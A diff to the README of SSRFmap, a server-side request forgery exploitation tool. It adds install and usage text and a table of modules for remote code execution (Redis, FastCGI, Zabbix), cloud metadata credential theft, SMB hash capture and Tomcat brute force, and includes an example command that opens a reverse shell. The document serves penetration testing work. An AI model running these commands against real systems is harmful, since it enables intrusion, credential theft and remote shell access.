@@ -11,19 +11,24 @@ Basic install from the Github repository.
 ```powershell
 git clone https://github.com/swisskyrepo/SSRFmap
 cd SSRFmap/
+pip3 install -r requirements.txt
 python3 ssrfmap.py
 
-usage: ssrfmap.py [-h] [-r REQFILE] [-p PARAM] [-m MODULES] [--lhost LHOST] [--lport LPORT] [--level LEVEL]
+usage: ssrfmap.py [-h] [-r REQFILE] [-p PARAM] [-m MODULES] [-l HANDLER]
+                  [--lhost LHOST] [--lport LPORT] [--uagent USERAGENT]
+                  [--ssl [SSL]] [--level [LEVEL]]
 
 optional arguments:
-  -h, --help     show this help message and exit
-  -r REQFILE     SSRF Request file
-  -p PARAM       SSRF Parameter to target
-  -m MODULES     SSRF Modules to enable
-  -l HANDLER     Start an handler for a reverse shell
-  --lhost LHOST  LHOST reverse shell
-  --lport LPORT  LPORT reverse shell
-  --level [LEVEL]  Level of test to perform (1-5, default: 1)
+  -h, --help          show this help message and exit
+  -r REQFILE          SSRF Request file
+  -p PARAM            SSRF Parameter to target
+  -m MODULES          SSRF Modules to enable
+  -l HANDLER          Start an handler for a reverse shell
+  --lhost LHOST       LHOST reverse shell
+  --lport LPORT       LPORT reverse shell
+  --uagent USERAGENT  User Agent to use
+  --ssl [SSL]         Use HTTPS without verification
+  --level [LEVEL]     Level of test to perform (1-5, default: 1)
 ```
 
 The default way to use this script is the following.
@@ -31,6 +36,9 @@ The default way to use this script is the following.
 ```powershell
 # Launch a portscan on localhost and read default files
 python ssrfmap.py -r data/request.txt -p url -m readfiles,portscan
+
+# Launch a portscan against an HTTPS endpoint using a custom user-agent
+python ssrfmap.py -r data/request.txt -p url -m portscan --ssl --uagent "SSRFmapAgent"
 
 # Triggering a reverse shell on a Redis
 python ssrfmap.py -r data/request.txt -p url -m redis --lhost=127.0.0.1 --lport=4242 -l 4242
@@ -56,12 +64,20 @@ The following modules are already implemented and can be used with the `-m` argu
 | `fastcgi`      | FastCGI RCE |
 | `redis`        | Redis RCE |
 | `github`       | Github Enterprise RCE < 2.8.7 |
-| `zaddix`        | Zaddix RCE |
+| `zabbix`       | Zabbix RCE |
 | `mysql`        | MySQL Command execution |
-| `smtp`        | SMTP send mail |
+| `docker`       | Docker Infoleaks via API |
+| `smtp`         | SMTP send mail |
 | `portscan`     | Scan ports for the host |
-| `networkscan`    | HTTP Ping sweep over the network |
+| `networkscan`  | HTTP Ping sweep over the network |
 | `readfiles`    | Read files such as `/etc/passwd` |
+| `alibaba`      | Read files from the provider (e.g: meta-data, user-data) |
+| `aws`          | Read files from the provider (e.g: meta-data, user-data) |
+| `gce`          | Read files from the provider (e.g: meta-data, user-data) |
+| `digitalocean` | Read files from the provider (e.g: meta-data, user-data) |
+| `socksproxy`   | SOCKS4 Proxy |
+| `smbhash`      | Force an SMB authentication via a UNC Path |
+| `tomcat`       | Bruteforce attack against Tomcat Manager |
 
 ## Contribute
 
@@ -69,7 +85,6 @@ I <3 pull requests :)
 Feel free to add any feature listed below or a new service.
 
 - aws and other cloud providers - extract sensitive data from http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy and more
-- sockserver  - SSRF SOCK proxy server - https://github.com/iamultra/ssrfsocks
 - handle request with file in requester
 - requester injection point in file (if param = None, check SSRFMAP in reqFile and replace with the payload)
 - add https://github.com/cujanovic/SSRF-Testing ip.py into the ip generator from core.utils
@@ -134,6 +149,6 @@ You can also contribute with a beer IRL or with `buymeacoffee.com`
 
 - [All you need to know about SSRF and how may we write tools to do auto-detect - Auxy](https://medium.com/bugbountywriteup/the-design-and-implementation-of-ssrf-attack-framework-550e9fda16ea)
 - [How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE! - Orange Tsai](https://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)
-- [Blog on Gopherus Tool  -SpyD3r](https://spyclub.tech/2018/blog-on-gopherus/)
+- [Blog on Gopherus Tool  -SpyD3r](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)
 - [Gopherus - Github](https://github.com/tarunkant/Gopherus)
 - [SSRF testing - cujanovic](https://github.com/cujanovic/SSRF-Testing)
